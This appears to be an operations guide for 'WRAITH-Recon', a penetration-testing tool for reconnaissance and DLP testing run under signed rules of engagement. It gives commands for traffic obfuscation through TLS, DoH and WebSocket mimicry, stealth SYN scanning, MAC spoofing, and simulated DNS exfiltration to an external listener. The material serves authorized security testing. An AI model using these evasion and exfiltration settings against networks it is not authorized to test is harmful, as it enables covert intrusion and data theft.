# WRAITH-Recon Operations Guide

**Document Version:** 1.0.0
**Last Updated:** 2025-11-29

---

## 1. Pre-Engagement Setup

### 1.1 Authorization & Scoping
Before deploying WRAITH-Recon, you **MUST** generate a signed Rules of Engagement (RoE) document.

#### Using ROE Templates

WRAITH-Recon provides pre-built ROE templates for common engagement types. Templates are located in `clients/wraith-recon/templates/`:

| Template | Use Case |
|----------|----------|
| `roe-minimal.json` | Quick internal assessments |
| `roe-standard.json` | Typical penetration tests |
| `roe-comprehensive.json` | Formal enterprise engagements |
| `roe-ctf.json` | Capture The Flag competitions |
| `roe-bug-bounty.json` | Bug bounty program participation |
| `roe-red-team.json` | Advanced adversary simulation |

#### Creating Your ROE

1. **Choose a template:**
   ```bash
   cp clients/wraith-recon/templates/roe-standard.json my-engagement-roe.json
   ```

2. **Customize the template:**
   - Update `id`, `organization`, `title`, `description`
   - Set `start_time` and `end_time` (RFC 3339 format)
   - Define `authorized_cidrs` and `authorized_domains`
   - List `excluded_targets` for off-limits systems
   - Configure `authorized_techniques` (MITRE ATT&CK IDs)
   - Set `prohibited_techniques` (destructive techniques)
   - Add `emergency_contacts` and `constraints`

3. **Sign the RoE using Ed25519:**
   ```bash
   wraith-recon-signer sign --config my-engagement-roe.json --key private.pem --out my-engagement-roe-signed.json
   ```

See `clients/wraith-recon/templates/README.md` for complete field documentation and the JSON schema at `clients/wraith-recon/templates/roe-schema.json` for validation.

### 1.2 Infrastructure
*   **Listener Node:** If testing exfiltration, set up a listener on an external VPS (AWS/Azure/DigitalOcean) running `wraith-server --mode listener`.
*   **Operator Machine:** Ensure the machine running `wraith-recon` has a NIC that supports AF_XDP (most modern Intel/Mellanox cards) and is running Linux Kernel 6.2+.

---

## 2. Protocol Configuration

### 2.1 Transport Mode Selection

WRAITH-Recon supports multiple transport modes with different performance characteristics:

**AF_XDP Mode (Maximum Performance):**
```bash
sudo wraith-recon --config scope.sig \
    --transport afxdp \
    --interface eth0 \
    --xdp-mode native \
    --umem-size 67108864
```
- Requires: Linux 6.2+, AF_XDP-capable NIC
- Performance: 10-40 Gbps throughput
- Latency: Sub-millisecond

**io_uring Mode (High Performance):**
```bash
sudo wraith-recon --config scope.sig \
    --transport iouring \
    --ring-size 4096 \
    --sqpoll
```
- Requires: Linux 5.19+
- Performance: 1-5 Gbps throughput
- Latency: 1-5 milliseconds

**UDP Fallback (Compatible):**
```bash
wraith-recon --config scope.sig \
    --transport udp \
    --bind-addr 0.0.0.0:0
```
- Requires: Any Linux/BSD/macOS
- Performance: 300+ Mbps throughput
- Latency: 10-50 milliseconds

### 2.2 Cryptographic Configuration

**Noise Protocol Selection:**
```bash
wraith-recon --config scope.sig \
    --noise-pattern XX \
    --static-key /path/to/private_key.pem \
    --peer-static-key /path/to/peer_public_key.pem
```

**Key Ratcheting Parameters:**
```bash
wraith-recon --config scope.sig \
    --ratchet-time 120 \     # DH ratchet every 2 minutes
    --ratchet-packets 1000000  # or after 1M packets
```

**Elligator2 Encoding:**
```bash
wraith-recon --config scope.sig \
    --elligator2 enable \
    --key-retry-limit 10  # Max retries for encodable key
```

### 2.3 Obfuscation Configuration

**Padding Mode:**
```bash
wraith-recon --config scope.sig \
    --padding-mode stealth \
    --padding-distribution 64:0.10,256:0.15,512:0.20,1024:0.25,1472:0.20,8960:0.10
```

**Timing Obfuscation:**
```bash
wraith-recon --config scope.sig \
    --timing-profile exponential \
    --mean-delay-ms 5.0 \
    --jitter-percent 50
```

**Protocol Mimicry:**
```bash
# TLS 1.3 Mimicry
wraith-recon --config scope.sig \
    --mimicry tls13 \
    --ja3-fingerprint "771,4865-4866-4867,0-23-65281,29-23-24,0" \
    --sni cdn.example.com

# DNS-over-HTTPS
wraith-recon --config scope.sig \
    --mimicry doh \
    --doh-server https://dns.google/dns-query

# WebSocket
wraith-recon --config scope.sig \
    --mimicry websocket \
    --ws-path /api/v1/stream
```

### 2.4 Performance Tuning

**Thread-per-Core:**
```bash
wraith-recon --config scope.sig \
    --cores 0,1,2,3 \         # Pin to specific cores
    --numa-node 0             # NUMA-aware allocation
```

**Zero-Copy Buffer Configuration:**
```bash
wraith-recon --config scope.sig \
    --umem-size 67108864 \    # 64MB UMEM
    --frame-size 2048 \        # 2KB frames
    --fill-queue-size 4096 \
    --rx-queue-size 4096 \
    --tx-queue-size 4096 \
    --comp-queue-size 4096
```

---

## 2. Deployment Modes

### 2.1 Mode: Passive Scout (Silent)
*   **Command:** `sudo wraith-recon --config scope.sig --mode passive --interface eth0`
*   **Behavior:**
    *   Promiscuous mode enabled.
    *   **NO** packets transmitted.
    *   TUI displays discovered hosts.
    *   Logs saved to `session_{timestamp}.pcap` and `findings.json`.

### 2.2 Mode: Active Mapper (Stealth)
*   **Command:** `sudo wraith-recon --config scope.sig --mode active --profile stealth`
*   **Behavior:**
    *   Sends SYN probes to discovered hosts.
    *   Uses high-jitter timing (1 probe per 1-5 seconds per host).
    *   Maps open ports and services.

### 2.3 Mode: Exfiltration Simulator
*   **Command:** `sudo wraith-recon --config scope.sig --mode exfil --target [LISTENER_IP] --strategy dns`
*   **Behavior:**
    *   Generates synthetic PII data.
    *   Attempts to tunnel data to the listener via DNS queries.
    *   Reports throughput and block rate.

---

## 3. Interpretation of Results

### 3.1 Findings Dashboard
*   **Green Nodes:** Hosts confirmed accessible.
*   **Red Nodes:** Hosts detected but blocked by firewall.
*   **Blue Links:** Detected traffic paths.

### 3.2 DLP Report
*   **Blocked:** Data transfer failed (connection reset, timeout, or 0 throughput).
*   **Throttled:** Data transferred but at < 10% of requested speed (Traffic Shaping detected).
*   **Bypassed:** Data transferred successfully at requested speed.

---

## 4. Troubleshooting

### 4.1 "AF_XDP Init Failed"
*   **Cause:** Kernel version too old or NIC driver incompatibility.
*   **Fix:** Update kernel to 6.2+ or use `--driver generic` (slower, copies packets).

### 4.2 "Governance Verification Failed"
*   **Cause:** `scope.sig` is corrupt, expired, or signed by the wrong key.
*   **Fix:** Regenerate signature with correct CA key. Check system clock.

### 4.3 "Link Detected but No Traffic"
*   **Cause:** Upstream switch port security (MAC filtering) or heavy firewalling.
*   **Fix:** Enable `--spoof-mac` to mimic a legitimate device on the segment (requires knowing a valid MAC).
